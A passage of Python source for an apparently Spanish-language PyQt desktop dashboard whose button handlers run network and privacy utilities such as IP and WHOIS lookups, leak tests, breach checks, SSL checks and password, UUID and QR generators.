    def _run_breach(self, field):
        email=field.text().strip()
        if not email: return
        self.log_info(f"📧 [Breach] Verificando {email} ...")
        def worker():
            result=BreachCheck().check(email)
            if isinstance(result, dict):
                level="error" if result.get("breaches",0)>0 else "success"
                self.log_block("📧", f"Breach - {email}", result, level=level)
            else:
                self.log_data("📧 Breach", str(result))
        threading.Thread(target=worker, daemon=True).start()
    def _run_breach2(self, field):
        self._run_breach(field)
    def _run_user(self, field):
        username=field.text().strip()
        if not username: return
        self.log_info(f"👤 [Username] Buscando '{username}' en 15 plataformas...")
        def worker():
            result=UsernameSearch().search(username)
            found=sum(1 for v in result.values() if "✅" in v)
            self.log_block("👤", f"Username Search - {username}", {"Encontrados": f"{found}/{len(result)}", **{k:v for k,v in list(result.items())[:10]}}, level="success" if found else "info")
            for k,v in result.items():
                if "✅" in v:
                    self.log_success(f"  ✅ {k}: {v}")
        threading.Thread(target=worker, daemon=True).start()

    def _run_fingerprint(self):
        self.log_info("🖐️ Generando fingerprint...")
        def worker():
            data=FingerprintTool().generate()
            self.log_block("🖐️", "Fingerprint", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_browser(self, field):
        ua=field.text().strip() or None
        data=BrowserInfoTool().parse(ua)
        self.log_block("🌐", "Browser Info", data, level="info")
    def _run_dnsleak(self):
        self.log_info("🔓 Chequeando DNS Leak...")
        def worker():
            data=DNSLeakTool().check()
            lvl="error" if data.get("leak_detected") else "success"
            self.log_block("🔓", "DNS Leak Test", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_webrtc(self):
        def worker():
            data=WebRTCLeakTool().check()
            lvl="warning" if data.get("leak_detected") else "success"
            self.log_block("📹", "WebRTC Leak", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_privacy_checkup(self):
        self.log_info("🛡️ Ejecutando Privacy Checkup...")
        def worker():
            data=PrivacyCheckupTool().run()
            lvl="success" if data.get("grade") in ["A","B"] else "warning" if data.get("grade")=="C" else "error"
            self.log_block("🛡️", "Privacy Checkup", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_torrentleak(self):
        def worker():
            data=TorrentLeakTool().check()
            self.log_block("🧲", "Torrent Leak", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_email_leak(self, field):
        email=field.text().strip()
        if not email: return
        self.log_info(f"📧 [Email Leak] {email} ...")
        def worker():
            data=EmailLeakTool().check(email)
            lvl="error" if data.get("breaches",0)>0 else "success"
            self.log_block("📧", f"Email Leak - {email}", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_pwdgen(self, spin, out):
        length=spin.value()
        data=PasswordGeneratorTool().generate(length)
        out.setText(data["password"])
        self.log_block("🔑", "Password Generator", data, level="success")
    def _run_blacklist(self, field):
        ip=field.text().strip()
        if not ip or not Utils.is_valid_ip(ip):
            self.log_warning("⚠️ IP inválida para Blacklist")
            return
        self.log_info(f"🚫 [Blacklist] Consultando {ip} en 12 listas...")
        def worker():
            data=BlacklistTool().check(ip)
            lvl="success" if data.get("clean") else "error"
            self.log_block("🚫", f"Blacklist - {ip}", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_secheaders(self, field):
        url=field.text().strip()
        if not url: return
        self.log_info(f"🛡️ [Security Headers] Analizando {url}...")
        def worker():
            data=SecurityHeadersTool().analyze(url)
            self.log_block("🛡️", f"Security Headers - {url}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_emailauth(self, field):
        domain=field.text().strip()
        if not domain: return
        self.log_info(f"✉️ [Email Auth] Verificando {domain}...")
        def worker():
            data=EmailAuthTool().check(domain)
            self.log_block("✉️", f"Email Auth - {domain}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_myip(self):
        self.log_info("🌍 Obteniendo tu IP...")
        def worker():
            data=MyIPTool().get()
            self.log_block("🌍", "My IP", data, level="success" if "ip" in data else "error")
        threading.Thread(target=worker, daemon=True).start()
    def _run_iplookup(self, field):
        ip=field.text().strip()
        if not ip: return
        self.log_info(f"🔎 [IP Lookup] {ip}...")
        def worker():
            data=IPLookupTool().lookup(ip)
            self.log_block("🔎", f"IP Lookup - {ip}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_asn(self, field):
        q=field.text().strip()
        if not q: return
        self.log_info(f"🏢 [ASN] {q}...")
        def worker():
            data=ASNLookupTool().lookup(q)
            self.log_block("🏢", f"ASN Lookup - {q}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_dns2(self, field, combo):
        domain=field.text().strip()
        dtype=combo.currentText()
        if not domain: return
        self.log_info(f"📡 [DNS] {domain} tipo {dtype}...")
        def worker():
            data=DNSLookup().lookup(domain, dtype)
            self.log_block("📡", f"DNS {dtype} - {domain}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_speedtest(self):
        self.log_info("⚡ Iniciando Speed Test...")
        def worker():
            data=SpeedTestTool().test()
            self.log_block("⚡", "Speed Test", data, level="success" if "download_mbps" in data else "error")
        threading.Thread(target=worker, daemon=True).start()
    def _run_rdns(self, field):
        ip=field.text().strip()
        if not ip: return
        self.log_info(f"🔄 [RDNS] {ip}...")
        def worker():
            data=ReverseDNSTool().lookup(ip)
            self.log_block("🔄", f"Reverse DNS - {ip}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_traceroute(self, field):
        host=field.text().strip()
        if not host: return
        self.log_info(f"🛣️ [Traceroute] {host}...")
        def worker():
            data=TracerouteTool().trace(host)
            hops=data.get("hops",[])
            self.log_block("🛣️", f"Traceroute - {host}", {"Target": host, "Saltos": len(hops), "Método": data.get("method","-")}, level="info")
            for h in hops[:15]:
                self.log_info(f"  ➡️ {h}")
            if data.get("error"):
                self.log_error(f"  ❌ {data['error']}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_whois(self, field):
        domain=field.text().strip()
        if not domain: return
        self.log_info(f"📜 [WHOIS] {domain}...")
        def worker():
            data=WHOISTool().lookup(domain)
            self.log_block("📜", f"WHOIS - {domain}", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_subnet(self, field):
        cidr=field.text().strip()
        if not cidr: return
        data=SubnetCalcTool().calc(cidr)
        lvl="error" if "error" in data else "success"
        self.log_block("🧮", f"Subnet Calc - {cidr}", data, level=lvl)
    def _run_cidr(self, field):
        self._run_subnet(field)
    def _run_iprange(self, f1, f2):
        s=f1.text().strip(); e=f2.text().strip()
        if not s or not e: return
        data=IPRangeToCIDRTool().convert(s,e)
        self.log_block("📏", f"Range {s} -> {e}", data, level="info")
    def _run_ipincidr(self, ip_f, cidr_f):
        ip=ip_f.text().strip(); cidr=cidr_f.text().strip()
        if not ip or not cidr: return
        data=IPInCIDRTool().check(ip,cidr)
        lvl="success" if data.get("inside") else "warning"
        self.log_block("📍", f"IP in CIDR - {ip} in {cidr}", data, level=lvl)
    def _run_special(self, field):
        ip=field.text().strip()
        if not ip: return
        data=SpecialIPTool().analyze(ip)
        self.log_block("⭐", f"Special IP - {ip}", data, level="info")
    def _run_down(self, field):
        url=field.text().strip()
        if not url: return
        self.log_info(f"🔌 [Down?] Verificando {url}...")
        def worker():
            data=DownTool().check(url)
            lvl="success" if data.get("is_up") else "error"
            self.log_block("🔌", f"Down? - {url}", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_bulk(self, field):
        text=field.toPlainText().strip()
        if not text: return
        ips=[ip.strip() for ip in re.split(r"[,\s\n]+", text) if ip.strip()]
        if len(ips)>50:
            self.log_warning("⚠️ Máximo 50 IPs para bulk")
            ips=ips[:50]
        self.log_info(f"📦 [Bulk] Consultando {len(ips)} IPs...")
        def worker():
            data=BulkLookupTool().lookup(ips)
            self.log_block("📦", f"Bulk Lookup - {len(ips)} IPs", data, level="info")
            if isinstance(data, dict) and "results" in data:
                for r in data["results"][:10]:
                    self.log_info(f"  🌐 {r.get('ip','?')} -> {r.get('country','?')} / {r.get('isp','?')}")
        threading.Thread(target=worker, daemon=True).start()
    def _run_bingo(self):
        data=BingoTool().generate()
        board=data["board"]
        html='<div style="font-family:monospace; font-size:11px;">'
        for row in board:
            html+='<div>'+' | '.join(f"{cell:^18}" for cell in row)+'</div>'
        self.log_block("🎲", "Bingo - Seguridad", {"Board": str(board)}, level="info")
        for row in board:
            self.log_info("  🎲 " + " | ".join(row))
    def _run_jwt(self, field):
        token=field.text().strip()
        if not token: return
        data=JWTDecoderTool().decode(token)
        lvl="success" if data.get("valid_format") else "error"
        self.log_block("🎟️", "JWT Decoder", data, level=lvl)
    def _run_epoch(self, field, combo):
        val=field.text().strip()
        mode=combo.currentText()
        tool=EpochConverterTool()
        if mode=="ahora" or not val:
            data=tool.now()
            self.log_block("⏰", "Epoch - Ahora", data, level="info")
        elif mode=="epoch→date":
            data=tool.to_date(val)
            self.log_block("⏰", f"Epoch {val} → Date", data, level="info" if "error" not in data else "error")
        else:
            data=tool.to_epoch(val)
            self.log_block("⏰", f"Date '{val}' → Epoch", data, level="info" if "error" not in data else "error")
    def _run_uuid(self, field, combo):
        val=field.text().strip()
        mode=combo.currentText()
        tool=UUIDTool()
        if mode=="validar":
            data=tool.validate(val)
            self.log_block("🆔", f"UUID Validate - {val[:20]}", data, level="success" if data.get("valid") else "error")
        else:
            ver={"v4":4,"v1":1,"v3":3,"v5":5}.get(mode,4)
            data=tool.generate(ver)
            field.setText(data["uuid"])
            self.log_block("🆔", f"UUID {mode.upper()} Generado", data, level="success")
    def _run_qr(self, field):
        text=field.text().strip()
        if not text: return
        data=QRCodeTool().generate(text)
        lvl="success" if data.get("success") else "warning"
        self.log_block("🔳", "QR Code", data, level=lvl)
        if data.get("path"):
            self.log_success(f"  💾 Guardado en: {data['path']}")
            try:
                import webbrowser, os
                if os.path.exists(data["path"]):
                    webbrowser.open(data["path"])
            except: pass
    def _run_emailheaders(self, field):
        text=field.toPlainText().strip()
        if not text: return
        data=EmailHeadersTool().parse(text)
        self.log_block("📧", "Email Headers", {"Headers": len(data["headers"]), **{k:str(v)[:80] for k,v in list(data["headers"].items())[:6]}}, level="info")
        self.log_block("🔍", "Análisis Email Auth", data["analysis"], level="info")
    def _run_ipconv(self, field):
        ip=field.text().strip()
        if not ip: return
        data=IPConverterTool().convert(ip)
        self.log_block("🔄", f"IP Converter - {ip}", data, level="info" if "error" not in data else "error")
    def _run_ipv6(self, field):
        ip=field.text().strip()
        if not ip: return
        data=IPv6ExpandTool().expand(ip)
        lvl="error" if "error" in data else "info"
        self.log_block("🌐", f"IPv6 - {ip}", data, level=lvl)
    def _run_mac(self, field, combo):
        val=field.text().strip()
        mode=combo.currentText()
        tool=MACTool()
        if mode=="generar" or not val:
            data=tool.generate()
            field.setText(data["mac"])
            self.log_block("💻", "MAC Generada", data, level="success")
        elif mode=="validar":
            data=tool.validate(val)
            lvl="success" if data.get("valid") else "error"
            self.log_block("💻", f"MAC Validate - {val}", data, level=lvl)
        else:
            data=tool.lookup(val)
            self.log_block("💻", f"MAC Lookup - {val}", data, level="info")
    def _run_screen(self):
        data=ScreenTool().get(self)
        self.log_block("🖥️", "Screen Info", data, level="info")
    def _run_useragent(self):
        data=UserAgentTool().get()
        self.log_block("🌐", "User Agent", data, level="info")
    def _run_headers(self):
        self.log_info("📋 Obteniendo headers...")
        def worker():
            data=HeadersTool().get()
            self.log_block("📋", "Headers", data, level="info")
        threading.Thread(target=worker, daemon=True).start()
    def _run_proxycheck(self):
        self.log_info("🕵️ Verificando proxy/VPN...")
        def worker():
            data=ProxyCheckTool().check()
            lvl="error" if data.get("is_proxy") else "success"
            self.log_block("🕵️", "Proxy Check", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_sysinfo(self):
        data=SystemInfoTool().get()
        self.log_block("💻", "System Info", data, level="info")
    def _run_timezone(self):
        data=TimezoneTool().get()
        self.log_block("⏰", "Timezone", data, level="info")
    def _run_language(self):
        data=LanguageTool().get()
        self.log_block("🗣️", "Language", data, level="info")
    def _run_location(self):
        self.log_info("📍 Obteniendo ubicación ...")
        def worker():
            data=LocationTool().get()
            self.log_block("📍", "Location", data, level="success" if "city" in data else "error")
        threading.Thread(target=worker, daemon=True).start()
    def _run_ssl(self, field):
        host=field.text().strip()
        if not host: return
        self.log_info(f"🔒 [SSL] Analizando {host}:443...")
        def worker():
            data=SSLTool().check(host)
            lvl="success" if data.get("success") and not data.get("expired") else "warning" if data.get("success") else "error"
            self.log_block("🔒", f"SSL/TLS - {host}", data, level=lvl)
        threading.Thread(target=worker, daemon=True).start()
    def _run_news(self):
        self.log_info("📰 Obteniendo noticias...")
        def worker():
            data=NewsTool().get()
            self.log_block("📰", "News", data, level="info")
            for t in data.get("titles",[])[:5]:
                self.log_info(f"  📰 {t}")
        threading.Thread(target=worker, daemon=True).start()
    def run(self):
        self.show()
        self.activateWindow()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setQuitOnLastWindowClosed(False)
    font = QFont("Segoe UI", 9)
    app.setFont(font)
    main = MethodPackGUI()
    main.show()
    app._main_window = main
    sys.exit(app.exec())